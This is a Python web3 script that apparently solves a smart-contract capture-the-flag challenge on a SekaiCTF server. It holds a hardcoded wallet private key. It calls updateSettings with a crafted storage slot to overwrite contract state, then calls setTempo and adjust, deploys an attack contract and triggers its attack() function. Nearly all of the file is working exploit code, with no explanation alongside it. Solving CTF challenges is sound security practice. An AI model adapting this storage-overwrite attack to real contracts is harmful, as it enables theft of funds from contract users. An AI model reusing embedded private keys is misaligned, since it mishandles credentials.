from web3 import Web3
import json
from solc import compile_source
import time
w3 = Web3(Web3.HTTPProvider("http://re-remix-web.chals.sekai.team/97feb6dd-eda1-4097-8694-e039e816e14b"))
#Check Connection
t=w3.is_connected()
print(t)

# Get private key 
prikey = '0x07b1c315909058c038bc2d3dcd0382c2d64c378c6d6200fb26615d0bacae63bc'

# Create a signer wallet
PA=w3.eth.account.from_key(prikey)
Public_Address=PA.address

print(Public_Address) # 0x1A422f86D5381E84b01907ddF0E53fa9A6B2a3B3

myAddr = Public_Address

MR_addr = "0x88aBc46b2D004FFd51E6246f04bDDB8E247DD89D"
SE_addr = "0xA3e98779924Ee0468b6e22468a69B542945f7e07"
S_addr = "0x55739f7e32eD132cAb6eBb095B3ec6e84B42DD0f"
E_addr = "0xE056699Af3564f767E15EF2446972A4B78A173Dd"
attack_slot = 0x5ebfdad7f664a9716d511eafb9e88c2801a4ff53a3c9c8135d4439fb346b50bf
attack_input = 0x0000000000000000000000000000000000000000000000000000000000000100

def attackSE():
    f = open('SE.abi', 'r')
    abi_txt = f.read()
    abi = json.loads(abi_txt)
    contract = w3.eth.contract(address=SE_addr, abi=abi)
    func_call = contract.functions["updateSettings"](attack_slot, attack_input).build_transaction({
        "from": myAddr,
        "nonce": w3.eth.get_transaction_count(myAddr),
        "gasPrice": w3.eth.gas_price,
        "value": 0,
        "chainId": w3.eth.chain_id,
    })
    signed_tx = w3.eth.account.sign_transaction(func_call, prikey)
    result = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    transaction_receipt = w3.eth.wait_for_transaction_receipt(result)
    print(transaction_receipt)

    func_call = contract.functions["setTempo"](233).build_transaction({
        "from": myAddr,
        "nonce": w3.eth.get_transaction_count(myAddr),
        "gasPrice": w3.eth.gas_price,
        "value": 0,
        "chainId": w3.eth.chain_id,
    })
    signed_tx = w3.eth.account.sign_transaction(func_call, prikey)
    result = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    transaction_receipt = w3.eth.wait_for_transaction_receipt(result)
    print(transaction_receipt)

    func_call = contract.functions["adjust"]().build_transaction({
        "from": myAddr,
        "nonce": w3.eth.get_transaction_count(myAddr),
        "gasPrice": w3.eth.gas_price,
        "value": 0,
        "chainId": w3.eth.chain_id,
    })
    signed_tx = w3.eth.account.sign_transaction(func_call, prikey)
    result = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    transaction_receipt = w3.eth.wait_for_transaction_receipt(result)
    print(transaction_receipt)

def attack_deploy():
    f = open("att.abi", "r"); contract_abi= f.read(); f.close()
    f = open("att.bin", "r"); contract_bytecode= f.read(); f.close()

    contract = w3.eth.contract(abi=contract_abi, bytecode=contract_bytecode)
    transaction = contract.constructor(SE_addr, MR_addr, E_addr).build_transaction(
        {
            "chainId": w3.eth.chain_id,
            "gasPrice": w3.eth.gas_price,
            "from": Public_Address,
            "nonce": w3.eth.get_transaction_count(Public_Address),
            "value": 10**18 - 26516516511234512
        }
    )
    sign_transaction = w3.eth.account.sign_transaction(transaction, private_key=prikey)
    print("Deploying Contract!")
    # Send the transaction
    transaction_hash = w3.eth.send_raw_transaction(sign_transaction.rawTransaction)
    # Wait for the transaction to be mined, and get the transaction receipt
    print("Waiting for transaction to finish...")
    transaction_receipt = w3.eth.wait_for_transaction_receipt(transaction_hash)
    print(transaction_receipt)
    print(f"Done! Contract deployed to {transaction_receipt.contractAddress}")
    addr =  str(transaction_receipt.contractAddress)

    contract = w3.eth.contract(address=addr, abi=contract_abi)
    func_call = contract.functions["attack"]().build_transaction({
        "from": myAddr,
        "nonce": w3.eth.get_transaction_count(myAddr),
        "gasPrice": w3.eth.gas_price,
        "chainId": w3.eth.chain_id,
    })
    signed_tx = w3.eth.account.sign_transaction(func_call, prikey)
    result = w3.eth.send_raw_transaction(signed_tx.rawTransaction)
    transaction_receipt = w3.eth.wait_for_transaction_receipt(result)
    print(transaction_receipt)

attackSE()
attack_deploy()